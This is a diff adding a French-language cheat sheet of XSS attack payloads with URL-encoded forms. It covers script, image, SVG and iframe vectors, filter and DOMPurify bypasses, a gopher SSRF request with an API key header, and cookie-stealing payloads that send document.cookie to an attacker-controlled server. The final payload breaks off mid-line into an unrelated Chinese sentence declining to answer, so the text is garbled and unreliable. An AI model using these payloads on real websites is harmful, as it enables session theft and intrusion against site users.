@@ -1,0 +1,101 @@
+Payloads:
+
+
+
+🧪 Payloads de base (JavaScript)
+
+Ces payloads sont conçus pour être insérés dans un paramètre d'URL et exécutés via une réflexion dans le HTML. Adaptez-les selon le contexte (dans une balise <script>, dans du texte, etc.).
+
+
+<p>Exemple basique (alerte simple)</p>
+Payload : <script>alert(1)</script>
+URL encodée : %3Cscript%3Ealert(1)%3C%2Fscript%3E
+
+<p>Vecteurs d'image (fallback si <script> est bloqué)</p>
+Payloads :
+- <img src=x onerror=alert(1)>
+- <img src=x onerror="alert('XSS')">
+- <img src=x onerror=javascript:alert(1)>
+URL encodée : %3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+
+<p>Utilisation de balises SVG (plus rare)</p>
+Payload : <svg/onload=alert(1)>
+URL encodée : %3Csvg%2Fonload%3Dalert(1)%3E
+
+<p>Utilisation de <iframe> (si autorisé)</p>
+Payload : <iframe src="javascript:alert(1)"></iframe>
+URL encodée : %3Ciframe%20src%3D%22javascript%3Aalert(1)%22%3E%3C%2Fiframe%3E
+
+<p>Utilisation de <details> et <summary> (exotique)</p>
+Payload : <details/open/onload=alert(1)>
+URL encodée : %3Cdetails%2Fopen%2Fonload%3Dalert(1)%3E
+
+<p>Utilisation de <form> (si le contexte est dans un formulaire)</p>
+Payload : <form action="javascript:alert(1)"><input type=submit></form>
+URL encodée : %3Cform%20action%3D%22javascript%3Aalert(1)%22%3E%3Cinput%20type%3Dsubmit%3E%3C%2Fform%3E
+
+
+🔍 Payloads avancés (bypass de filtres simples)
+
+Si le site filtre certaines balises ou attributs, ces payloads peuvent aider à contourner les restrictions.
+
+
+<p>Utilisation de <textarea> (si le contexte est dans un textarea)</p>
+Payload : </textarea><script>alert(1)</script>
+URL encodée : %3C%2Ftextarea%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E
+
+<p>Utilisation de <template> (pour injecter du HTML dynamique)</p>
+Payload : <template><script>alert(1)</script></template>
+URL encodée : %3Ctemplate%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E%3C%2Ftemplate%3E
+
+<p>Utilisation de <style> (si <script> est bloqué)</p>
+Payload : <style>body{background:url("javascript:alert(1)")}</style>
+URL encodée : %3Cstyle%3Ebody%7Bbackground%3Aurl(%22javascript%3Aalert(1)%22)%7D%3C%2Fstyle%3E
+
+<p>Utilisation de <meta> (rare, contexte spécifique)</p>
+Payload : <meta http-equiv="refresh" content="0;url=javascript:alert(1)">
+URL encodée : %3Cmeta%20http-equiv%3D%22refresh%22%20content%3D%220%3Burl%3Djavascript%3Aalert(1)%22%3E
+
+
+🛡️ Payloads pour bypass de protections (DOMPurify, etc.)
+
+Si le site utilise une bibliothèque comme DOMPurify pour assainir le HTML, les payloads doivent exploiter des vulnérabilités spécifiques à cette bibliothèque.
+
+
+<p>Exploit DOMPurify (versions anciennes)</p>
+Payload : <div id="1
+![](contenteditable/autofocus/onfocus=confirm('qwq')//index.html)">
+URL encodée (complexe, utilisez un encodeur URL pour les sauts de ligne) :
+%3Cdiv%20id%3D%221%0A!%5B%5D(contenteditable%2Fautofocus%2Fonfocus%3Dconfirm('qwq')%2F%2Findex.html)%22%3E
+
+<p>Exploit via attribut title (si DOMPurify est mal configuré)</p>
+Payload : <a title="a
+<img src=x onerror=alert(1)>">yep</a>
+URL encodée : %3Ca%20title%3D%22a%0A%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E%22%3Eyep%3C%2Fa%3E
+
+<p>Exploit via style (si l'assainissement est laxiste)</p>
+Payload : <p x="`<img src=x onerror=alert(1)>"></p>
+URL encodée : %3Cp%20x%3D%22%60%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E%22%3E%3C%2Fp%3E
+
+
+🌐 Payloads via gopher (pour SSRF ou injection dans des logs)
+
+Si l'URL est ensuite utilisée dans une requête interne (comme un fetch), le protocole gopher peut être exploité.
+
+
+<p>Exemple de payload gopher (pour SSRF ou injection dans un service interne)</p>
+Payload : gopher://127.0.0.1:1337/_GET%20/api/dev%20HTTP/1.1%0D%0AHost:%20127.0.0.1:1337%0D%0Ax-api-key:%20934caf984a4ca94817ead87d37af4b3%0D%0AConnection:%20close%0D%0A%0D%0A
+URL encodée : Utilisez un encodeur URL pour chaque caractère spécial (ex: %3A pour :, %2F pour /)
+
+
+🔧 Payloads pour vol de cookies (si XSS persistant ou réfléchi)
+
+Ces payloads volent les cookies de la victime et les envoient à un serveur contrôlé (remplacez http://<YOUR_SERVER_IP> par votre IP/serveur).
+
+
+<p>Vol de cookies via image (onerror)</p>
+Payload : <img src=x onerror=this.src="http://<YOUR_SERVER_IP>/?c="+document.cookie>
+URL encodée : %3Cimg%20src%3Dx%20onerror%3Dthis.src%3D%22http%3A%2F%2F%3CYOUR_SERVER_IP%3E%2F%3Fc%3D%22%2Bdocument.cookie%3E
+
+<p>Vol de cookies via script</p>
+Payload : <script>new Image().src="关于这个问题，我暂时无法回答，让我们换个问题吧
